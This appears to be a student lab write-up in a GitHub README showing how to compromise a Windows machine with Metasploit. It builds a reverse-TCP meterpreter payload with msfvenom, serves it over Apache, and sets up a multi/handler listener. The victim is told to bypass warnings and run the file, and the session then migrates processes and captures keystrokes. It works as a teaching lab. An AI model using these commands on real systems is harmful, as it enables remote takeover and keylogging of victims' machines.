# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig
![Screenshot 2024-10-28 155116](https://github.com/user-attachments/assets/1d9adda2-6b08-43e5-9ba0-0a0b6182a123)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
![Screenshot 2024-10-28 155126](https://github.com/user-attachments/assets/c4186dc4-8a67-4130-8402-2c71843126db)


copy the fun.exe into the apache /var/www/html folder
![Screenshot 2024-10-28 155134](https://github.com/user-attachments/assets/6c659000-a73b-426d-8123-498e32c9c84c)


copy the fun.exe into the apache /var/www/html folder
![Screenshot 2024-10-28 155142](https://github.com/user-attachments/assets/a8eff1cc-a7ff-4448-aa55-ef705268b9d9)
Check the status of apache2
![Screenshot 2024-10-28 155151](https://github.com/user-attachments/assets/bb0992ea-2970-4c8b-91c9-19d6c0ccdcc1)

Invoke msfconsole:
![Screenshot 2024-10-28 155213](https://github.com/user-attachments/assets/e3ba9239-c20d-4d12-8bbf-ade55975613f)
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
![Screenshot 2024-10-28 155231](https://github.com/user-attachments/assets/7cab5bb0-884b-4c47-920e-dcf2ff56d355)


Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
![Screenshot 2024-10-28 155241](https://github.com/user-attachments/assets/fcd4b7b8-bd68-4e03-aa46-32db3bf54d43)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.
![Screenshot 2024-10-28 155249](https://github.com/user-attachments/assets/6483cae8-853a-4258-a5b4-ca7dfb3eaff1)

Bypass any warning boxes, double-click the file, and allow it to run.
![Screenshot 2024-10-28 155257](https://github.com/user-attachments/assets/9896537b-3889-4b0b-a4c6-4e207032efc1)

On kali give the command exploit
![Screenshot 2024-10-28 155305](https://github.com/user-attachments/assets/1b0473a9-1a0b-4580-a72e-b740707c431f)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156
![Screenshot 2024-10-28 155315](https://github.com/user-attachments/assets/152350c4-c89c-4f6f-993e-40f2fc6a6c78)


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command: migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted
![Screenshot 2024-10-28 155331](https://github.com/user-attachments/assets/7d75b10e-92e0-4187-9582-43bc29f179b7)
![Screenshot 2024-10-28 155342](https://github.com/user-attachments/assets/0159dde1-ca2a-48e9-8994-cb0904b78867)


Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![Screenshot 2024-10-28 155352](https://github.com/user-attachments/assets/9e3e8016-4b29-47ab-b844-0b6486daefaf)



keyscan_dump Shows the keystrokes captured so far
![Screenshot 2024-10-28 155352](https://github.com/user-attachments/assets/ee98d8b7-14b4-4f2a-9514-1d80dc59ac1e)



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
